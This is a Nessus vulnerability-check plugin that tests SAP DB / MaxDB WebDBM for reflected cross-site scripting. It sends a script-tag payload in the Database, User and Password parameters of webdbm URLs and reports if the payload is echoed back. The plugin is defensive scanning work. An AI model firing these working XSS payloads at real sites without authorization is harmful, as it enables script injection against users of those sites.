#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36072);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(34319);

  script_name(english:"SAP DB / MaxDB WebDBM Multiple Parameter XSS");
  script_summary(english:"Checks for XSS flaws in webdbm");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a script that is affected by multiple\n",
      "cross-site scripting vulnerabilities."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote web server contains the WebDBM script, a component of SAP\n",
      "DB / MaxDB.\n",
      "\n",
      "The version of this script found on the remote host fails to sanitize\n",
      "user-supplied input to its 'Database', 'User', and 'Password'\n",
      "parameters before using it to generate dynamic content.  An\n",
      "unauthenticated remote attacker may be able to leverage this issue to\n",
      "inject arbitrary HTML or script code into a user's browser to be\n",
      "executed within the security context of the affected site."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/502318/30/0/threaded"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "The vendor reportedly recommends replacing WebDBM with 'Database\n",
      "Studio'."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 9999);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:9999);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like SAP DB.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: SAP-Internet-SapDb-Server/" >!< banner) exit(0);
}


xss = string('nessus">', "<script>alert('", SCRIPT_NAME, "')</script>/");
exss = urlencode(str:xss);


# Try to exploit one of the issues.
if (thorough_tests)
{
  exploits = make_list(
    string("/webdbm?Event=DBM_LOGON&Action=VIEW&Server=&Database=", exss),
    string("/webdbm?Event=DBM_LOGON&Action=VIEW&Server=&User=", exss),
    string("/webdbm?Event=DBM_LOGON&Action=VIEW&Server=&Database=&User=&Password=", exss)
  );
}
else
{
  exploits = make_list(
    string("/webdbm?Event=DBM_LOGON&Action=VIEW&Server=&Database=", exss)
  );
}

foreach url (exploits)
{
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);
  if ("<title>Web DBM<" >!< res[2]) exit(0);

  # There's a problem if our exploit appears along with the time in a form.
  if (string(' value="', xss, '">') >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

    exit(0);
  }
}
